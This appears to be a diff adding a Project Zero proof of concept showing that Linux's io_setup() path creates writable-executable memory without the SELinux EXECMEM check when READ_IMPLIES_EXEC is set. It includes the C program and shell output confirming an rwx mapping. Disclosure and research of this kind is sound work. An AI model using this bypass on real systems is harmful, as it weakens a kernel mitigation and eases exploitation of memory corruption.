@@ -1,0 +1,47 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=854
+
+SELinux has a set of permissions that can be used to prevent processes from creating executable
+memory mappings that contain data controlled by the process (PROCESS__EXECMEM, PROCESS__EXECHEAP, ...).
+These permissions, when applied correctly, make exploitation of memory corruption issues somewhat more
+difficult and much more annoying.
+
+When a process tries to map memory using sys_mmap_pgoff(), vm_mmap_pgoff() is called, which first
+performs the LSM security check by calling security_mmap_file() and then calls do_mmap_pgoff(), which
+takes care of the rest and does not rerun the same security check.
+
+The syscall handler for io_setup() calls ioctx_alloc(), which calls aio_setup_ring(), which allocates
+memory via do_mmap_pgoff() - the method that doesn't contain the security check.
+
+aio_setup_ring() only requests that the memory is mapped as PROT_READ | PROT_WRITE; however, if the
+process has called personality(READ_IMPLIES_EXEC) before, this will actually result in the creation
+of a memory mapping that is both writable and executable, bypassing the SELinux restriction.
+
+To verify: (note: I actually tested this without SELinux since the code looks pretty straightforward
+and I don't want to figure out how to set up SELinux rules)
+
+$ cat > iosetup.c
+*/
+
+#define _GNU_SOURCE
+#include <linux/aio_abi.h>
+#include <unistd.h>
+#include <sys/syscall.h>
+#include <err.h>
+#include <sys/personality.h>
+
+int main(void) {
+  aio_context_t ctx;
+  personality(READ_IMPLIES_EXEC);
+  if (syscall(__NR_io_setup, 1, &ctx))
+    err(1, "io_setup");
+  while (1) pause();
+}
+
+/*
+$ gcc -o iosetup iosetup.c
+$ ./iosetup &
+[1] 4949
+$ cat /proc/4949/maps | grep aio
+7fa0b59c6000-7fa0b59c7000 rwxs 00000000 00:0b 36093330                   /[aio] (deleted)
+*/
